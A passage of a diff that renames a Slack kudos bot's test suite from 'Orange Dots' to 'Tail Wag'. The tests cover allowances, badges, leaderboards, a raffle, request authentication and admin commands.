@@ -1,5 +1,5 @@
 /**
- * Orange Dots — test suite.
+ * Tail Wag — test suite.
  * Run with: node test/run.js
  */
 
@@ -167,14 +167,14 @@ test('x2 sets the count and is stripped from the reason', () => {
 test('repeated trigger emoji set the count', () => {
   const env = freshEnv();
   const p = env.call('parseGive_',
-    '<@U08SAM01> :large_orange_circle::large_orange_circle::large_orange_circle: three whole sessions covered');
+    '<@U08SAM01> :jackson::jackson::jackson: three whole sessions covered');
   eq(p.dots, 3);
   eq(p.reason, 'three whole sessions covered');
 });
 
-test('a single trigger emoji still means one dot', () => {
+test('a single trigger emoji still means one wag', () => {
   const env = freshEnv();
-  const p = env.call('parseGive_', '<@U08SAM01> :large_orange_circle: saved the Denver auth today');
+  const p = env.call('parseGive_', '<@U08SAM01> :jackson: saved the Denver auth today');
   eq(p.dots, 1);
 });
 
@@ -239,54 +239,54 @@ suite('Validation rules');
 
 test('a reason under the minimum is refused, with an example', () => {
   const env = freshEnv();
-  const out = slashCommand(env, '/dot', '<@U08SAM01> thanks');
+  const out = slashCommand(env, '/wag', '<@U08SAM01> thanks');
   const b = body(out);
   eq(b.response_type, 'ephemeral');
   includes(b.text, 'Add a reason');
-  includes(b.text, '/dot <@U08SAM01>');
+  includes(b.text, '/wag <@U08SAM01>');
 });
 
 test('self-kudos is refused', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot', '<@U08JOSH1> I did a wonderful job today'));
-  includes(b.text, 'No dots for yourself');
+  const b = body(slashCommand(env, '/wag', '<@U08JOSH1> I did a wonderful job today'));
+  includes(b.text, 'No wags for yourself');
 });
 
 test('@channel is refused', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot', '<!channel> everyone was brilliant this week'));
+  const b = body(slashCommand(env, '/wag', '<!channel> everyone was brilliant this week'));
   includes(b.text, 'not to `@channel`');
 });
 
 test('too many recipients in one command is refused', () => {
   const env = freshEnv({ MAX_RECIPIENTS_PER_MESSAGE: 2 });
-  const b = body(slashCommand(env, '/dot',
+  const b = body(slashCommand(env, '/wag',
     '<@U08SAM01> <@U08DANA1> <@U08LEE01> all three covered for me this week'));
   includes(b.text, 'the limit is 2');
 });
 
 test('a value tag can be made mandatory', () => {
   const env = freshEnv({ VALUE_REQUIRED: true });
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   includes(b.text, 'Tag the value');
   includes(b.text, '#real-world');
 });
 
-test('PAUSED refuses new dots but leaves lookups working', () => {
+test('PAUSED refuses new wags but leaves lookups working', () => {
   const env = freshEnv({ PAUSED: true });
-  const give = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const give = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   includes(give.text, 'paused');
-  const look = body(slashCommand(env, '/dots', 'leaderboard'));
+  const look = body(slashCommand(env, '/wags', 'leaderboard'));
   assert(look.text.indexOf('paused') === -1, 'leaderboards should still answer while paused');
 });
 
 // ===========================================================================
-suite('Giving dots');
+suite('Giving wags');
 // ===========================================================================
 
-test('a valid dot lands, announces in channel, and debits the giver', () => {
+test('a valid wag lands, announces in channel, and debits the giver', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   eq(b.response_type, 'in_channel');
   includes(JSON.stringify(b.blocks), 'U08SAM01');
   includes(JSON.stringify(b.blocks), 'covered two sessions at no notice');
@@ -302,7 +302,7 @@ test('a valid dot lands, announces in channel, and debits the giver', () => {
 
 test('the ledger records the give with its reason and value', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> #bigger-lives got him ordering his own lunch');
+  slashCommand(env, '/wag', '<@U08SAM01> #bigger-lives got him ordering his own lunch');
   const rows = env.sheetRows('Ledger');
   eq(rows.length, 1);
   eq(String(rows[0].giver_id), 'U08JOSH1');
@@ -315,11 +315,11 @@ test('the ledger records the give with its reason and value', () => {
 test('the weekly allowance is enforced', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
   for (let i = 0; i < 5; i++) {
-    slashCommand(env, '/dot', `<@U08SAM01> great work on thing number ${i} this week`);
+    slashCommand(env, '/wag', `<@U08SAM01> great work on thing number ${i} this week`);
   }
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> one more great thing this week'));
-  eq(b.response_type, 'ephemeral', 'the sixth dot must not be announced');
-  includes(b.text, 'out of dots');
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> one more great thing this week'));
+  eq(b.response_type, 'ephemeral', 'the sixth wag must not be announced');
+  includes(b.text, 'out of wags');
 
   const sam = env.call('getBalance_', 'U08SAM01', 'sam');
   eq(env.call('num_', sam.received_total), 5, 'exactly five should have landed');
@@ -327,20 +327,20 @@ test('the weekly allowance is enforced', () => {
 
 test('the per-recipient cap stops one person soaking up the whole allowance', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 2 });
-  slashCommand(env, '/dot', '<@U08SAM01> first excellent thing this week');
-  slashCommand(env, '/dot', '<@U08SAM01> second excellent thing this week');
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> third excellent thing this week'));
+  slashCommand(env, '/wag', '<@U08SAM01> first excellent thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> second excellent thing this week');
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> third excellent thing this week'));
   includes(b.text, 'already given them');
 
   const sam = env.call('getBalance_', 'U08SAM01', 'sam');
   eq(env.call('num_', sam.received_total), 2);
   const josh = env.call('getBalance_', 'U08JOSH1', 'josh');
-  eq(env.call('num_', josh.remaining), 3, 'the refused dot must not be debited');
+  eq(env.call('num_', josh.remaining), 3, 'the refused wag must not be debited');
 });
 
 test('the per-recipient cap trims an over-sized give rather than refusing it', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 2 });
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> x3 carried the whole week single handed'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> x3 carried the whole week single handed'));
   eq(b.response_type, 'in_channel');
   const sam = env.call('getBalance_', 'U08SAM01', 'sam');
   eq(env.call('num_', sam.received_total), 2, 'should be trimmed to the cap, not refused');
@@ -348,44 +348,44 @@ test('the per-recipient cap trims an over-sized give rather than refusing it', (
 
 test('a partial give works: what fits lands, the rest is reported back', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  // Spend down to one dot.
-  for (let i = 0; i < 4; i++) slashCommand(env, '/dot', `<@U08LEE01> thing number ${i} done well`);
+  // Spend down to one wag.
+  for (let i = 0; i < 4; i++) slashCommand(env, '/wag', `<@U08LEE01> thing number ${i} done well`);
   env.clearFetches();
 
-  slashCommand(env, '/dot', '<@U08SAM01> <@U08DANA1> you both covered for me this week');
+  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> you both covered for me this week');
   const sam = env.call('getBalance_', 'U08SAM01', 'sam');
   const dana = env.call('getBalance_', 'U08DANA1', 'dana');
   eq(env.call('num_', sam.received_total) + env.call('num_', dana.received_total), 1,
-    'only one dot was left, so exactly one should have landed');
+    'only one wag was left, so exactly one should have landed');
 
   const ephemerals = env.fetchesTo('chat.postEphemeral');
   assert(ephemerals.length >= 1, 'the giver should be told what was skipped');
-  includes(JSON.stringify(ephemerals[ephemerals.length - 1].payload), 'out of dots');
+  includes(JSON.stringify(ephemerals[ephemerals.length - 1].payload), 'out of wags');
 });
 
 test('multiple recipients each get the full amount when there is room', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> <@U08DANA1> you both covered the weekend between you');
+  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> you both covered the weekend between you');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
   eq(env.call('num_', env.call('getBalance_', 'U08DANA1', 'dana').received_total), 1);
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 3);
 });
 
-test('bots cannot receive dots', () => {
+test('bots cannot receive wags', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot', '<@U08BOT01> you are a wonderful little robot'));
-  includes(b.text, 'Bots do not collect dots');
+  const b = body(slashCommand(env, '/wag', '<@U08BOT01> you are a wonderful little robot'));
+  includes(b.text, 'Bots do not collect wags');
 });
 
-test('deactivated accounts cannot receive dots', () => {
+test('deactivated accounts cannot receive wags', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot', '<@U08GONE1> thanks for everything you did here'));
+  const b = body(slashCommand(env, '/wag', '<@U08GONE1> thanks for everything you did here'));
   includes(b.text, 'deactivated');
 });
 
 test('managers draw from their own pool', () => {
   const env = freshEnv({ MANAGER_USER_IDS: 'U08JOSH1', ALLOWANCE_MANAGER: 8, ALLOWANCE_PEER: 3 });
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const josh = env.call('getBalance_', 'U08JOSH1', 'josh');
   eq(String(josh.pool), 'manager');
   eq(env.call('num_', josh.allowance), 8);
@@ -395,9 +395,9 @@ test('managers draw from their own pool', () => {
   eq(env.call('num_', sam.allowance), 3, 'a peer keeps the peer allowance');
 });
 
-test('allowance refills when the period turns over, and unused dots expire', () => {
+test('allowance refills when the period turns over, and unused wags expire', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4);
 
   env.setNow(new Date('2026-09-23T18:00:00Z')); // next Wednesday
@@ -407,9 +407,9 @@ test('allowance refills when the period turns over, and unused dots expire', () 
   eq(env.call('num_', after.given_total), 1, 'lifetime totals must survive the reset');
 });
 
-test('carry-over rolls unused dots forward when switched on', () => {
+test('carry-over rolls unused wags forward when switched on', () => {
   const env = freshEnv({ CARRY_OVER_UNUSED: true, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   env.setNow(new Date('2026-09-23T18:00:00Z'));
   const after = env.call('getBalance_', 'U08JOSH1', 'josh');
   eq(env.call('num_', after.remaining), 9, '4 carried forward plus a fresh 5');
@@ -417,18 +417,18 @@ test('carry-over rolls unused dots forward when switched on', () => {
 
 test('the per-recipient cap resets with the period', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 1 });
-  slashCommand(env, '/dot', '<@U08SAM01> first excellent thing this week');
-  const blocked = body(slashCommand(env, '/dot', '<@U08SAM01> second excellent thing this week'));
+  slashCommand(env, '/wag', '<@U08SAM01> first excellent thing this week');
+  const blocked = body(slashCommand(env, '/wag', '<@U08SAM01> second excellent thing this week'));
   includes(blocked.text, 'already given them');
 
   env.setNow(new Date('2026-09-23T18:00:00Z'));
-  const next = body(slashCommand(env, '/dot', '<@U08SAM01> a brand new week, a brand new dot'));
+  const next = body(slashCommand(env, '/wag', '<@U08SAM01> a brand new week, a brand new wag'));
   eq(next.response_type, 'in_channel', 'the cap should have reset with the week');
 });
 
 test('the received-this-period counter resets but totals do not', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   env.setNow(new Date('2026-09-23T18:00:00Z'));
   const sam = env.call('getBalance_', 'U08SAM01', 'sam');
   eq(env.call('num_', sam.received_this_period), 0);
@@ -437,12 +437,12 @@ test('the received-this-period counter resets but totals do not', () => {
 
 test('daily mode refills every day', () => {
   const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  for (let i = 0; i < 5; i++) slashCommand(env, '/dot', `<@U08SAM01> good thing number ${i} today`);
-  const spent = body(slashCommand(env, '/dot', '<@U08SAM01> one more good thing today'));
-  includes(spent.text, 'out of dots');
+  for (let i = 0; i < 5; i++) slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} today`);
+  const spent = body(slashCommand(env, '/wag', '<@U08SAM01> one more good thing today'));
+  includes(spent.text, 'out of wags');
 
   env.setNow(new Date('2026-09-17T18:00:00Z'));
-  const tomorrow = body(slashCommand(env, '/dot', '<@U08SAM01> a fresh day and a fresh dot'));
+  const tomorrow = body(slashCommand(env, '/wag', '<@U08SAM01> a fresh day and a fresh wag'));
   eq(tomorrow.response_type, 'in_channel');
 });
 
@@ -451,16 +451,16 @@ suite('Badges and streaks');
 // ===========================================================================
 
 test('a badge is awarded on crossing its threshold, exactly once', () => {
-  const env = freshEnv({ BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':large_orange_circle:', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> first good thing this week');
-  slashCommand(env, '/dot', '<@U08SAM01> second good thing this week');
+  const env = freshEnv({ BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':jackson:', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
+  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
   eq(env.sheetRows('Badges').length, 0, 'not yet at the threshold');
 
-  const third = body(slashCommand(env, '/dot', '<@U08SAM01> third good thing this week'));
+  const third = body(slashCommand(env, '/wag', '<@U08SAM01> third good thing this week'));
   includes(JSON.stringify(third.blocks), 'Pilot Light');
   eq(env.sheetRows('Badges').length, 1);
 
-  slashCommand(env, '/dot', '<@U08SAM01> fourth good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> fourth good thing this week');
   eq(env.sheetRows('Badges').length, 1, 'a badge must not be awarded twice');
 });
 
@@ -469,8 +469,8 @@ test('giving badges track generosity separately from popularity', () => {
     GIVER_BADGE_THRESHOLDS: '2', GIVER_BADGE_LABELS: 'Noticer', GIVER_BADGE_EMOJI: ':eyes:',
     MAX_PER_RECIPIENT_PER_PERIOD: 0
   });
-  slashCommand(env, '/dot', '<@U08SAM01> first good thing this week');
-  const second = body(slashCommand(env, '/dot', '<@U08DANA1> second good thing this week'));
+  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
+  const second = body(slashCommand(env, '/wag', '<@U08DANA1> second good thing this week'));
   includes(JSON.stringify(second.blocks), 'Noticer');
   const rows = env.sheetRows('Badges').filter((r) => String(r.track) === 'giver');
   eq(rows.length, 1);
@@ -479,22 +479,22 @@ test('giving badges track generosity separately from popularity', () => {
 
 test('a giving streak extends across consecutive periods and resets after a gap', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> week one good thing happened');
+  slashCommand(env, '/wag', '<@U08SAM01> week one good thing happened');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1);
 
   env.setNow(new Date('2026-09-23T18:00:00Z'));
-  slashCommand(env, '/dot', '<@U08SAM01> week two good thing happened');
+  slashCommand(env, '/wag', '<@U08SAM01> week two good thing happened');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 2);
 
   env.setNow(new Date('2026-10-14T18:00:00Z')); // three weeks later
-  slashCommand(env, '/dot', '<@U08SAM01> week five good thing happened');
+  slashCommand(env, '/wag', '<@U08SAM01> week five good thing happened');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1, 'a gap resets the streak');
 });
 
 test('giving twice in one period does not double-count the streak', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> first good thing this week');
-  slashCommand(env, '/dot', '<@U08SAM01> second good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1);
 });
 
@@ -502,11 +502,11 @@ test('giving twice in one period does not double-count the streak', () => {
 suite('Leaderboards');
 // ===========================================================================
 
-test('ranks by dots received, with ties sharing a rank', () => {
+test('ranks by wags received, with ties sharing a rank', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x2 two dots for sam this week');
-  slashCommand(env, '/dot', '<@U08DANA1> one dot for dana this week');
-  slashCommand(env, '/dot', '<@U08LEE01> one dot for lee this week');
+  slashCommand(env, '/wag', '<@U08SAM01> x2 two wags for sam this week');
+  slashCommand(env, '/wag', '<@U08DANA1> one wag for dana this week');
+  slashCommand(env, '/wag', '<@U08LEE01> one wag for lee this week');
 
   const rows = env.call('leaderboard_', 'period', 10);
   eq(rows[0].user_id, 'U08SAM01');
@@ -516,9 +516,9 @@ test('ranks by dots received, with ties sharing a rank', () => {
   eq(rows[2].rank, 2, 'a tie shares the rank');
 });
 
-test('people with no dots are left off the board', () => {
+test('people with no wags are left off the board', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const rows = env.call('leaderboard_', 'period', 10);
   eq(rows.length, 1);
   eq(rows[0].user_id, 'U08SAM01');
@@ -526,8 +526,8 @@ test('people with no dots are left off the board', () => {
 
 test('the generosity board ranks givers', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x2 two good things this week');
-  slashCommand(env, '/dot', '<@U08DANA1> another good thing this week', { user_id: 'U08LEE01', user_name: 'lee' });
+  slashCommand(env, '/wag', '<@U08SAM01> x2 two good things this week');
+  slashCommand(env, '/wag', '<@U08DANA1> another good thing this week', { user_id: 'U08LEE01', user_name: 'lee' });
   const rows = env.call('giverLeaderboard_', 10);
   eq(rows[0].user_id, 'U08JOSH1');
   eq(rows[0].dots, 2);
@@ -535,7 +535,7 @@ test('the generosity board ranks givers', () => {
 
 test('the all-time board survives a period rollover', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   env.setNow(new Date('2026-09-23T18:00:00Z'));
   env.run('cacheDropAll_();');
   eq(env.call('leaderboard_', 'period', 10).length, 0, 'the new week starts empty');
@@ -546,15 +546,15 @@ test('the all-time board survives a period rollover', () => {
 suite('The raffle');
 // ===========================================================================
 
-test('each dot received is one entry', () => {
+test('each wag received is one entry', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x3 three dots means three entries');
+  slashCommand(env, '/wag', '<@U08SAM01> x3 three wags means three entries');
   eq(env.call('myRaffleEntries_', 'U08SAM01', env.call('monthKey_')), 3);
 });
 
 test('the per-person entry cap is respected', () => {
   const env = freshEnv({ RAFFLE_MAX_ENTRIES_PER_PERSON: 2, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x3 three dots but only two entries');
+  slashCommand(env, '/wag', '<@U08SAM01> x3 three wags but only two entries');
   eq(env.call('myRaffleEntries_', 'U08SAM01', env.call('monthKey_')), 2);
 });
 
@@ -629,14 +629,14 @@ test('last month\'s winner can be excluded from this month\'s drum', () => {
 suite('Emoji and reaction giving');
 // ===========================================================================
 
-test('typing the emoji with a mention in any channel gives a dot', () => {
+test('typing the emoji with a mention in any channel gives a wag', () => {
   const env = freshEnv();
   env.call('handleEvent_', {
     type: 'event_callback',
     team_id: 'T_TEST',
     event: {
       type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000000.000100',
-      text: '<@U08SAM01> :large_orange_circle: saved me two hours on the auth today'
+      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
     }
   });
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
@@ -652,7 +652,7 @@ test('a redelivered message event does not award twice', () => {
     team_id: 'T_TEST',
     event: {
       type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000000.000200',
-      text: '<@U08SAM01> :large_orange_circle: saved me two hours on the auth today'
+      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
     }
   };
   env.call('handleEvent_', event);
@@ -679,25 +679,25 @@ test('bot messages and edits are ignored', () => {
     type: 'event_callback', team_id: 'T_TEST',
     event: {
       type: 'message', subtype: 'message_changed', user: 'U08JOSH1', channel: 'C_GENERAL',
-      ts: '1758000000.000400', text: '<@U08SAM01> :large_orange_circle: edited into existence'
+      ts: '1758000000.000400', text: '<@U08SAM01> :jackson: edited into existence'
     }
   });
   env.call('handleEvent_', {
     type: 'event_callback', team_id: 'T_TEST',
     event: {
       type: 'message', bot_id: 'B123', channel: 'C_GENERAL', ts: '1758000000.000500',
-      text: '<@U08SAM01> :large_orange_circle: posted by a bot'
+      text: '<@U08SAM01> :jackson: posted by a bot'
     }
   });
   eq(env.sheetRows('Ledger').length, 0);
 });
 
-test('reacting with the trigger emoji gives the author a dot, using their message as the reason', () => {
+test('reacting with the trigger emoji gives the author a wag, using their message as the reason', () => {
   const env = freshEnv();
   env.call('handleEvent_', {
     type: 'event_callback', team_id: 'T_TEST',
     event: {
-      type: 'reaction_added', user: 'U08JOSH1', reaction: 'large_orange_circle',
+      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
       item_user: 'U08SAM01', item: { type: 'message', channel: 'C_GENERAL', ts: '1758000001.000100' }
     }
   });
@@ -712,7 +712,7 @@ test('reacting to your own message gives nothing', () => {
   env.call('handleEvent_', {
     type: 'event_callback', team_id: 'T_TEST',
     event: {
-      type: 'reaction_added', user: 'U08JOSH1', reaction: 'large_orange_circle',
+      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
       item_user: 'U08JOSH1', item: { type: 'message', channel: 'C_GENERAL', ts: '1758000002.000100' }
     }
   });
@@ -738,7 +738,7 @@ suite('Request authentication');
 test('a request without the URL secret is rejected', () => {
   const env = freshEnv();
   const out = env.call('doPost', {
-    parameter: { command: '/dot', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
+    parameter: { command: '/wag', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
     postData: { type: 'application/x-www-form-urlencoded', contents: '' }
   });
   eq(out.getContent(), 'unauthorized');
@@ -748,7 +748,7 @@ test('a request without the URL secret is rejected', () => {
 test('a request with the wrong URL secret is rejected', () => {
   const env = freshEnv();
   const out = env.call('doPost', {
-    parameter: { k: 'wrong', command: '/dot', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
+    parameter: { k: 'wrong', command: '/wag', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
     postData: { type: 'application/x-www-form-urlencoded', contents: '' }
   });
   eq(out.getContent(), 'unauthorized');
@@ -758,7 +758,7 @@ test('a request from another workspace is rejected even with the right secret', 
   const env = freshEnv();
   const out = env.call('doPost', {
     parameter: {
-      k: 'secret123', command: '/dot', text: '<@U08SAM01> a perfectly good reason here',
+      k: 'secret123', command: '/wag', text: '<@U08SAM01> a perfectly good reason here',
       user_id: 'U08JOSH1', team_id: 'T_SOMEONE_ELSE'
     },
     postData: { type: 'application/x-www-form-urlencoded', contents: '' }
@@ -770,7 +770,7 @@ test('a correctly signed request goes through', () => {
   const env = freshEnv();
   const out = env.call('doPost', {
     parameter: {
-      k: 'secret123', command: '/dot', text: '<@U08SAM01> covered two sessions at no notice',
+      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
       user_id: 'U08JOSH1', user_name: 'josh', channel_id: 'C_GENERAL', channel_name: 'general',
       team_id: 'T_TEST'
     },
@@ -783,7 +783,7 @@ test('the legacy verification token is checked when configured', () => {
   const env = freshEnv({ SLACK_VERIFICATION_TOKEN: 'vtoken' });
   const bad = env.call('doPost', {
     parameter: {
-      k: 'secret123', command: '/dot', text: '<@U08SAM01> covered two sessions at no notice',
+      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
       user_id: 'U08JOSH1', team_id: 'T_TEST', token: 'nope'
     },
     postData: { type: 'application/x-www-form-urlencoded', contents: '' }
@@ -792,7 +792,7 @@ test('the legacy verification token is checked when configured', () => {
 
   const good = env.call('doPost', {
     parameter: {
-      k: 'secret123', command: '/dot', text: '<@U08SAM01> covered two sessions at no notice',
+      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
       user_id: 'U08JOSH1', user_name: 'josh', channel_id: 'C_GENERAL',
       team_id: 'T_TEST', token: 'vtoken'
     },
@@ -851,33 +851,33 @@ test('the url_verification challenge is echoed back', () => {
 suite('Lookups');
 // ===========================================================================
 
-test('/dots shows your own balance', () => {
+test('/wags shows your own balance', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
-  const b = body(slashCommand(env, '/dots', ''));
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
+  const b = body(slashCommand(env, '/wags', ''));
   includes(b.text, '4 of 5');
 });
 
-test('/dots @someone shows their standing, not yours', () => {
+test('/wags @someone shows their standing, not yours', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
-  const b = body(slashCommand(env, '/dots', '<@U08SAM01>'));
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
+  const b = body(slashCommand(env, '/wags', '<@U08SAM01>'));
   includes(JSON.stringify(b.blocks), 'U08SAM01');
   includes(JSON.stringify(b.blocks), 'covered two sessions at no notice');
 });
 
-test('/dots leaderboard renders the board', () => {
+test('/wags leaderboard renders the board', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
-  const b = body(slashCommand(env, '/dots', 'leaderboard'));
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
+  const b = body(slashCommand(env, '/wags', 'leaderboard'));
   includes(JSON.stringify(b.blocks), 'U08SAM01');
 });
 
-test('/dots help explains the rules that are actually configured', () => {
+test('/wags help explains the rules that are actually configured', () => {
   const env = freshEnv({ ALLOWANCE_PEER: 7, MAX_PER_RECIPIENT_PER_PERIOD: 3 });
-  const b = body(slashCommand(env, '/dots', 'help'));
+  const b = body(slashCommand(env, '/wags', 'help'));
   const text = JSON.stringify(b.blocks);
-  includes(text, '7 dots per week');
+  includes(text, '7 wags per week');
   includes(text, 'At most *3*');
 });
 
@@ -893,70 +893,70 @@ suite('Admin commands');
 
 test('non-admins are refused', () => {
   const env = freshEnv();
-  const b = body(slashCommand(env, '/dot-admin', 'status'));
+  const b = body(slashCommand(env, '/wag-admin', 'status'));
   includes(b.text, 'admin-only');
 });
 
 test('admins see status', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  const b = body(slashCommand(env, '/dot-admin', 'status'));
-  includes(JSON.stringify(b.blocks), 'Orange Dots — status');
+  const b = body(slashCommand(env, '/wag-admin', 'status'));
+  includes(JSON.stringify(b.blocks), 'Tail Wag — status');
 });
 
-test('grant awards dots without touching anyone\'s allowance', () => {
+test('grant awards wags without touching anyone\'s allowance', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  slashCommand(env, '/dot-admin', 'grant <@U08SAM01> 3 for the conference talk');
+  slashCommand(env, '/wag-admin', 'grant <@U08SAM01> 3 for the conference talk');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 3);
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 5,
-    'a grant must not cost the admin their own dots');
+    'a grant must not cost the admin their own wags');
 });
 
 test('topup adds to someone\'s remaining allowance', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  slashCommand(env, '/dot-admin', 'topup <@U08SAM01> 4');
+  slashCommand(env, '/wag-admin', 'topup <@U08SAM01> 4');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').remaining), 9);
 });
 
 test('set changes a known setting and refuses an unknown one', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  const ok = body(slashCommand(env, '/dot-admin', 'set ALLOWANCE_PEER 9'));
+  const ok = body(slashCommand(env, '/wag-admin', 'set ALLOWANCE_PEER 9'));
   includes(ok.text, 'is now');
   eq(env.call('cfgNum', 'ALLOWANCE_PEER'), 9);
 
-  const bad = body(slashCommand(env, '/dot-admin', 'set NOT_A_SETTING 1'));
+  const bad = body(slashCommand(env, '/wag-admin', 'set NOT_A_SETTING 1'));
   includes(bad.text, 'not a known setting');
 });
 
 test('set refuses to handle secrets from Slack', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  const b = body(slashCommand(env, '/dot-admin', 'set SLACK_BOT_TOKEN xoxb-leaked'));
+  const b = body(slashCommand(env, '/wag-admin', 'set SLACK_BOT_TOKEN xoxb-leaked'));
   includes(b.text, 'not settable from Slack');
